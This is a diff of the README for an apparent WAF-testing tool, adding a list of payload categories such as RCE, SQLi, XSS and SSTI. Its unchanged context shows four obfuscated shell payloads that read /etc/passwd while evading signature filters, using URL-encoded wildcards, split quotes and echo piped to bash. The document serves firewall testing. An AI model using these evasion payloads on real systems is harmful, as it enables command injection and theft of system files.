@@ -7,12 +7,29 @@ WAF Bypass is developed by Nemesida WAF team ([nemesida-waf.com](https://nemesid
 ![WAF Bypass Script](https://camo.githubusercontent.com/9ccddb9274eefa8bbe31cc1b0df79782ea6a92d5985b8eeab093a2cd83ad834a/68747470733a2f2f686162726173746f726167652e6f72672f776562742f73642f756a2f39312f7364756a39317333752d5f356a653970666b6e64306577696c6a732e706e67)
 
 There are attacks for which it is impossible to create a signature, while not increasing the number of false positives. Therefore, it is absolutely normal that Nemesida WAF Free bypass the attack, and the commercial version of Nemesida WAF Free blocks. For example, we can execute the <code>cat /etc/passwd</code> command in the following ways:
+
 <pre>
 %2f???%2f??t%20%2f???%2fp??s??
 cat+/e't'c/pa'ss'wd
 e'c'ho 'swd test pentest' | awk '{print "cat /etc/pas"$1}' | bash
 ec'h'o 'cat /etc/examplewd' | sed 's/example/pass/g' | bash
 </pre>
+
+### Payloads type and description
+- CM (Custom HTTP Method)
+- FP (False Positive)
+- LDAP (LDAP Injection etc.)
+- LFI (Local File Include)
+- MFD (multipart/form-data)
+- NoSQLi (NoSQL injection)
+- OR (Open Redirect)
+- RCE (Remote Code Execution)
+- RFI (Remote File Inclusion)
+- SQLi (SQL injection)
+- SSI (Server-Side Includes)
+- SSTI (Server-Side Template Injection)
+- UWA (Unwanted Access)
+- XSS (Cross-Site Scripting)
 
 ## How to run
 
